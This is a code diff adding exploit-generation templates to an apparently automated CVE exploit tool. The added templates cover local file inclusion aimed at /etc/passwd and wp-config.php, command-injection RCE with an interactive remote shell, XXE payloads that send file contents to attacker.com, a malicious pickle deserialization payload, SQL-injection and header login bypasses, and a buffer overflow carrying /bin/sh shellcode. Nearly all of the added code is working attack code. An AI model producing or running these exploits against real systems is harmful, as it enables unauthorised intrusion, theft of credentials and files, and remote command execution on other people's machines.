@@ -7336,12 +7336,19 @@ exec(base64.b64decode('{base64.b64encode(code.encode()).decode()}'))
             specific_details["payload_location"] = "xml"
             
         # File read/traversal detection
-        elif any(keyword in description_lower for keyword in ["file read", "directory traversal", "path traversal", "arbitrary file", "file disclosure", "local file inclusion", "lfi"]):
+        elif any(keyword in description_lower for keyword in ["file read", "directory traversal", "path traversal", "arbitrary file", "file disclosure", "local file inclusion", "lfi", "file inclusion"]):
             vuln_type = "file_read"
             if "directory traversal" in description_lower or "path traversal" in description_lower:
                 specific_details["traversal_type"] = "directory"
+            elif "local file inclusion" in description_lower or "lfi" in description_lower:
+                specific_details["traversal_type"] = "lfi"
             else:
                 specific_details["traversal_type"] = "file_read"
+            
+            # Extract parameter names for LFI
+            param_matches = re.findall(r'(?:via|parameter|param)\s+([a-zA-Z_][a-zA-Z0-9_]*)', description)
+            if param_matches:
+                specific_details["parameters"] = param_matches
                 
         # Authentication bypass
         elif any(keyword in description_lower for keyword in ["authentication bypass", "auth bypass", "login bypass"]):
@@ -7619,10 +7626,14 @@ if __name__ == "__main__":
     def _generate_file_read_exploit(self, cve_data, target_info, details):
         """Generate file read/directory traversal exploit"""
         cve_id = cve_data.get("cve_id", "")
+        parameter = details.get("parameters", ["portal_type"])[0] if details.get("parameters") else "portal_type"
+        traversal_type = details.get("traversal_type", "file_read")
         
         return f'''#!/usr/bin/env python3
-# File Read/Directory Traversal Exploit for {cve_id}
+# Local File Inclusion (LFI) Exploit for {cve_id}
 # Vulnerability: {cve_data.get("description", "")[:100]}...
+# Parameter: {parameter}
+# Type: {traversal_type}
 
 import requests
 import sys
@@ -7660,16 +7671,20 @@ class FileReadExploit:
         
         return payloads
     
-    def test_file_read(self, parameter="file"):
-        """Test file read vulnerability"""
-        print(f"[+] Testing file read on parameter: {{parameter}}")
+    def test_file_read(self, parameter="{parameter}"):
+        """Test LFI vulnerability on WordPress"""
+        print(f"[+] Testing LFI on parameter: {{parameter}}")
         
+        # WordPress-specific files and common targets
         test_files = [
             "/etc/passwd",
             "/etc/hosts", 
             "/proc/version",
-            "C:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
-            "/var/www/html/index.php"
+            "/var/www/html/wp-config.php",
+            "/var/log/apache2/access.log",
+            "/var/log/nginx/access.log",
+            "../../../../etc/passwd",
+            "php://filter/convert.base64-encode/resource=wp-config.php"
         ]
         
         for target_file in test_files:
@@ -7933,6 +7948,536 @@ python3 exploit.py <target_url>"""
 - Check target software version matches vulnerable range
 - Monitor application logs for exploitation attempts
 - Verify patch status before testing"""
+
+    def _generate_rce_exploit(self, cve_data, target_info, details):
+        """Generate RCE exploit based on CVE details"""
+        cve_id = cve_data.get("cve_id", "")
+        
+        return f'''#!/usr/bin/env python3
+# Remote Code Execution Exploit for {cve_id}
+# Vulnerability: {cve_data.get("description", "")[:100]}...
+
+import requests
+import sys
+import subprocess
+from urllib.parse import quote
+
+class RCEExploit:
+    def __init__(self, target_url):
+        self.target_url = target_url.rstrip('/')
+        self.session = requests.Session()
+        
+    def test_rce(self, command="id"):
+        """Test for RCE vulnerability"""
+        print(f"[+] Testing RCE with command: {{command}}")
+        
+        # Common RCE payloads
+        payloads = [
+            # Command injection
+            f"; {{command}}",
+            f"| {{command}}",
+            f"&& {{command}}",
+            f"|| {{command}}",
+            
+            # Template injection
+            f"${{{{{{command}}}}}}",
+            f"{{{{{{command}}}}}}",
+            
+            # Deserialization payloads
+            f"{{command}}",
+            
+            # OS command injection
+            f"`{{command}}`",
+            f"$({{command}})",
+        ]
+        
+        for i, payload in enumerate(payloads):
+            try:
+                # Test GET parameters
+                response = self.session.get(
+                    self.target_url,
+                    params={{"cmd": payload, "exec": payload, "system": payload}}
+                )
+                
+                # Look for command output indicators
+                if self._check_rce_indicators(response.text, command):
+                    print(f"[+] RCE found with payload {{i+1}}: {{payload}}")
+                    return True
+                
+                # Test POST data
+                response = self.session.post(
+                    self.target_url,
+                    data={{"cmd": payload, "exec": payload, "system": payload}}
+                )
+                
+                if self._check_rce_indicators(response.text, command):
+                    print(f"[+] RCE found with POST payload {{i+1}}: {{payload}}")
+                    return True
+                    
+            except Exception as e:
+                continue
+                
+        return False
+    
+    def _check_rce_indicators(self, response_text, command):
+        """Check response for RCE indicators"""
+        if command == "id":
+            indicators = ["uid=", "gid=", "groups="]
+        elif command == "whoami":
+            indicators = ["root", "www-data", "apache", "nginx"]
+        elif command == "pwd":
+            indicators = ["/", "\\\\", "C:"]
+        else:
+            indicators = [command]
+            
+        return any(indicator in response_text for indicator in indicators)
+    
+    def execute_command(self, command):
+        """Execute a specific command"""
+        print(f"[+] Executing command: {{command}}")
+        
+        if self.test_rce(command):
+            print(f"[+] Command executed successfully")
+            return True
+        else:
+            print(f"[-] Command execution failed")
+            return False
+
+def main():
+    if len(sys.argv) < 2:
+        print(f"Usage: python3 {{sys.argv[0]}} <target_url> [command]")
+        print(f"Example: python3 {{sys.argv[0]}} http://target.com id")
+        sys.exit(1)
+    
+    target_url = sys.argv[1]
+    command = sys.argv[2] if len(sys.argv) > 2 else "id"
+    
+    exploit = RCEExploit(target_url)
+    
+    print(f"[+] RCE Exploit for {cve_id}")
+    print(f"[+] Target: {{target_url}}")
+    
+    if exploit.test_rce(command):
+        print("[+] RCE vulnerability confirmed!")
+        
+        # Interactive shell
+        while True:
+            try:
+                cmd = input("RCE> ").strip()
+                if cmd.lower() in ['exit', 'quit']:
+                    break
+                if cmd:
+                    exploit.execute_command(cmd)
+            except KeyboardInterrupt:
+                break
+    else:
+        print("[-] No RCE vulnerability found")
+
+if __name__ == "__main__":
+    main()
+'''
+
+    def _generate_xxe_exploit(self, cve_data, target_info, details):
+        """Generate XXE exploit based on CVE details"""
+        cve_id = cve_data.get("cve_id", "")
+        
+        return f'''#!/usr/bin/env python3
+# XXE (XML External Entity) Exploit for {cve_id}
+# Vulnerability: {cve_data.get("description", "")[:100]}...
+
+import requests
+import sys
+
+class XXEExploit:
+    def __init__(self, target_url):
+        self.target_url = target_url.rstrip('/')
+        self.session = requests.Session()
+        
+    def generate_xxe_payloads(self):
+        """Generate XXE payloads"""
+        payloads = [
+            # Basic file read
+            '<?xml version="1.0" encoding="UTF-8"?>\\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\\n<root>&xxe;</root>',
+            
+            # Windows file read
+            '<?xml version="1.0" encoding="UTF-8"?>\\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/windows/system32/drivers/etc/hosts">]>\\n<root>&xxe;</root>',
+            
+            # HTTP request (SSRF)
+            '<?xml version="1.0" encoding="UTF-8"?>\\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>\\n<root>&xxe;</root>',
+            
+            # Parameter entity
+            '<?xml version="1.0" encoding="UTF-8"?>\\n<!DOCTYPE root [\\n<!ENTITY % xxe SYSTEM "file:///etc/passwd">\\n<!ENTITY % param1 "<!ENTITY exfil SYSTEM \\'http://attacker.com/?%xxe;\\'>">\\n%param1;\\n]>\\n<root>&exfil;</root>'
+        ]
+        
+        return payloads
+    
+    def test_xxe(self):
+        """Test for XXE vulnerability"""
+        print("[+] Testing XXE vulnerability...")
+        
+        payloads = self.generate_xxe_payloads()
+        
+        for i, payload in enumerate(payloads):
+            try:
+                headers = {{"Content-Type": "application/xml"}}
+                response = self.session.post(
+                    self.target_url,
+                    data=payload,
+                    headers=headers
+                )
+                
+                # Check for file content indicators
+                indicators = [
+                    "root:", "daemon:", "bin:",  # /etc/passwd
+                    "localhost", "127.0.0.1",   # hosts file
+                    "<?xml", "<!DOCTYPE"        # XML processing
+                ]
+                
+                if any(indicator in response.text for indicator in indicators):
+                    print(f"[+] XXE vulnerability found with payload {{i+1}}")
+                    print(f"[+] Response: {{response.text[:200]}}...")
+                    return True
+                    
+            except Exception as e:
+                continue
+                
+        return False
+
+def main():
+    if len(sys.argv) != 2:
+        print(f"Usage: python3 {{sys.argv[0]}} <target_url>")
+        print(f"Example: python3 {{sys.argv[0]}} http://target.com/xml")
+        sys.exit(1)
+    
+    target_url = sys.argv[1]
+    exploit = XXEExploit(target_url)
+    
+    print(f"[+] XXE Exploit for {cve_id}")
+    print(f"[+] Target: {{target_url}}")
+    
+    if exploit.test_xxe():
+        print("[+] XXE vulnerability confirmed!")
+    else:
+        print("[-] No XXE vulnerability found")
+
+if __name__ == "__main__":
+    main()
+'''
+
+    def _generate_deserialization_exploit(self, cve_data, target_info, details):
+        """Generate deserialization exploit based on CVE details"""
+        cve_id = cve_data.get("cve_id", "")
+        
+        return f'''#!/usr/bin/env python3
+# Deserialization Exploit for {cve_id}
+# Vulnerability: {cve_data.get("description", "")[:100]}...
+
+import requests
+import sys
+import base64
+import pickle
+import json
+
+class DeserializationExploit:
+    def __init__(self, target_url):
+        self.target_url = target_url.rstrip('/')
+        self.session = requests.Session()
+        
+    def create_pickle_payload(self, command):
+        """Create malicious pickle payload"""
+        class ExploitPayload:
+            def __reduce__(self):
+                import subprocess
+                return (subprocess.call, ([command], ))
+        
+        payload = ExploitPayload()
+        serialized = pickle.dumps(payload)
+        encoded = base64.b64encode(serialized).decode()
+        return encoded
+    
+    def test_deserialization(self):
+        """Test for deserialization vulnerabilities"""
+        print("[+] Testing deserialization vulnerability...")
+        
+        test_command = "ping -c 1 127.0.0.1"  # Safe test command
+        
+        # Test different serialization formats
+        payloads = {{
+            "pickle": self.create_pickle_payload(test_command),
+            "json": json.dumps({{"__type__": "os.system", "command": test_command}}),
+            "java": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAF4"
+        }}
+        
+        for format_type, payload in payloads.items():
+            try:
+                # Test different parameters
+                test_params = ["data", "payload", "object", "serialized"]
+                
+                for param in test_params:
+                    response = self.session.post(
+                        self.target_url,
+                        data={{param: payload}}
+                    )
+                    
+                    # Check for deserialization indicators
+                    if response.status_code in [200, 500] and len(response.text) > 0:
+                        print(f"[+] Potential {{format_type}} deserialization found")
+                        return True
+                        
+            except Exception as e:
+                continue
+                
+        return False
+
+def main():
+    if len(sys.argv) != 2:
+        print(f"Usage: python3 {{sys.argv[0]}} <target_url>")
+        print(f"Example: python3 {{sys.argv[0]}} http://target.com/deserialize")
+        sys.exit(1)
+    
+    target_url = sys.argv[1]
+    exploit = DeserializationExploit(target_url)
+    
+    print(f"[+] Deserialization Exploit for {cve_id}")
+    print(f"[+] Target: {{target_url}}")
+    
+    if exploit.test_deserialization():
+        print("[+] Deserialization vulnerability confirmed!")
+    else:
+        print("[-] No deserialization vulnerability found")
+
+if __name__ == "__main__":
+    main()
+'''
+
+    def _generate_auth_bypass_exploit(self, cve_data, target_info, details):
+        """Generate authentication bypass exploit"""
+        cve_id = cve_data.get("cve_id", "")
+        
+        return f'''#!/usr/bin/env python3
+# Authentication Bypass Exploit for {cve_id}
+# Vulnerability: {cve_data.get("description", "")[:100]}...
+
+import requests
+import sys
+
+class AuthBypassExploit:
+    def __init__(self, target_url):
+        self.target_url = target_url.rstrip('/')
+        self.session = requests.Session()
+        
+    def test_sql_auth_bypass(self):
+        """Test SQL injection authentication bypass"""
+        print("[+] Testing SQL injection auth bypass...")
+        
+        bypass_payloads = [
+            "admin' --",
+            "admin' #",
+            "admin'/*",
+            "' or 1=1--",
+            "' or 1=1#",
+            "') or '1'='1--",
+            "admin' or '1'='1",
+        ]
+        
+        for payload in bypass_payloads:
+            try:
+                data = {{
+                    "username": payload,
+                    "password": "anything"
+                }}
+                
+                response = self.session.post(
+                    f"{{self.target_url}}/login",
+                    data=data
+                )
+                
+                # Check for successful login indicators
+                success_indicators = [
+                    "dashboard", "welcome", "logout", "admin panel",
+                    "successful", "redirect"
+                ]
+                
+                if any(indicator in response.text.lower() for indicator in success_indicators):
+                    print(f"[+] SQL injection bypass successful: {{payload}}")
+                    return True
+                    
+            except Exception as e:
+                continue
+                
+        return False
+    
+    def test_header_bypass(self):
+        """Test header-based authentication bypass"""
+        print("[+] Testing header-based auth bypass...")
+        
+        bypass_headers = [
+            {{"X-Forwarded-For": "127.0.0.1"}},
+            {{"X-Real-IP": "127.0.0.1"}},
+            {{"X-Remote-User": "admin"}},
+            {{"X-Forwarded-User": "admin"}},
+            {{"Authorization": "Bearer admin"}},
+        ]
+        
+        for headers in bypass_headers:
+            try:
+                response = self.session.get(
+                    f"{{self.target_url}}/admin",
+                    headers=headers
+                )
+                
+                if response.status_code == 200:
+                    print(f"[+] Header bypass successful: {{headers}}")
+                    return True
+                    
+            except Exception as e:
+                continue
+                
+        return False
+
+def main():
+    if len(sys.argv) != 2:
+        print(f"Usage: python3 {{sys.argv[0]}} <target_url>")
+        print(f"Example: python3 {{sys.argv[0]}} http://target.com")
+        sys.exit(1)
+    
+    target_url = sys.argv[1]
+    exploit = AuthBypassExploit(target_url)
+    
+    print(f"[+] Authentication Bypass Exploit for {cve_id}")
+    print(f"[+] Target: {{target_url}}")
+    
+    success = False
+    if exploit.test_sql_auth_bypass():
+        print("[+] SQL injection authentication bypass confirmed!")
+        success = True
+        
+    if exploit.test_header_bypass():
+        print("[+] Header-based authentication bypass confirmed!")
+        success = True
+        
+    if not success:
+        print("[-] No authentication bypass found")
+
+if __name__ == "__main__":
+    main()
+'''
+
+    def _generate_buffer_overflow_exploit(self, cve_data, target_info, details):
+        """Generate buffer overflow exploit"""
+        cve_id = cve_data.get("cve_id", "")
+        arch = target_info.get("target_arch", "x64")
+        
+        return f'''#!/usr/bin/env python3
+# Buffer Overflow Exploit for {cve_id}
+# Architecture: {arch}
+# Vulnerability: {cve_data.get("description", "")[:100]}...
+
+import struct
+import socket
+import sys
+
+class BufferOverflowExploit:
+    def __init__(self, target_host, target_port):
+        self.target_host = target_host
+        self.target_port = int(target_port)
+        
+    def create_pattern(self, length):
+        """Create cyclic pattern for offset discovery"""
+        pattern = ""
+        for i in range(length):
+            pattern += chr(65 + (i % 26))  # A-Z pattern
+        return pattern
+    
+    def generate_shellcode(self):
+        """Generate shellcode for {arch}"""
+        if "{arch}" == "x86":
+            # x86 execve("/bin/sh") shellcode
+            shellcode = (
+                "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e"
+                "\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
+            )
+        else:
+            # x64 execve("/bin/sh") shellcode
+            shellcode = (
+                "\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73"
+                "\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05"
+            )
+        
+        return shellcode.encode('latin-1')
+    
+    def create_exploit(self, offset=140):
+        """Create buffer overflow exploit"""
+        print(f"[+] Creating buffer overflow exploit...")
+        print(f"[+] Offset: {{offset}} bytes")
+        
+        # Pattern to reach return address
+        padding = "A" * offset
+        
+        if "{arch}" == "x86":
+            # x86 return address (example)
+            ret_addr = struct.pack("<I", 0x08048080)  # Adjust for target
+        else:
+            # x64 return address (example)
+            ret_addr = struct.pack("<Q", 0x0000000000401000)  # Adjust for target
+        
+        # NOP sled
+        nop_sled = "\\x90" * 16
+        
+        # Shellcode
+        shellcode = self.generate_shellcode()
+        
+        exploit = padding.encode() + ret_addr + nop_sled.encode('latin-1') + shellcode
+        
+        print(f"[+] Exploit size: {{len(exploit)}} bytes")
+        return exploit
+    
+    def send_exploit(self, payload):
+        """Send exploit to target"""
+        try:
+            print(f"[+] Connecting to {{self.target_host}}:{{self.target_port}}")
+            
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((self.target_host, self.target_port))
+            
+            print("[+] Sending exploit...")
+            sock.send(payload)
+            
+            # Try to interact
+            try:
+                response = sock.recv(1024)
+                print(f"[+] Response: {{response}}")
+            except:
+                pass
+                
+            sock.close()
+            print("[+] Exploit sent successfully")
+            
+        except Exception as e:
+            print(f"[-] Error: {{e}}")
+
+def main():
+    if len(sys.argv) != 3:
+        print(f"Usage: python3 {{sys.argv[0]}} <target_host> <target_port>")
+        print(f"Example: python3 {{sys.argv[0]}} 192.168.1.100 9999")
+        sys.exit(1)
+    
+    target_host = sys.argv[1]
+    target_port = sys.argv[2]
+    
+    exploit = BufferOverflowExploit(target_host, target_port)
+    
+    print(f"[+] Buffer Overflow Exploit for {cve_id}")
+    print(f"[+] Target: {{target_host}}:{{target_port}}")
+    print(f"[+] Architecture: {arch}")
+    
+    # Create and send exploit
+    payload = exploit.create_exploit()
+    exploit.send_exploit(payload)
+
+if __name__ == "__main__":
+    main()
+'''
 
     def _generate_usage_instructions(self, vuln_type, params):
         """Generate usage instructions for the exploit"""
@@ -8949,7 +9494,8 @@ def create_summary_report():
             return jsonify({"error": "No data provided"}), 400
 
         # Create summary report
-        report = ModernVisualEngine.create_summary_report(data)
+        visual_engine = ModernVisualEngine()
+        report = visual_engine.create_summary_report(data)
 
         return jsonify({
             "success": True,
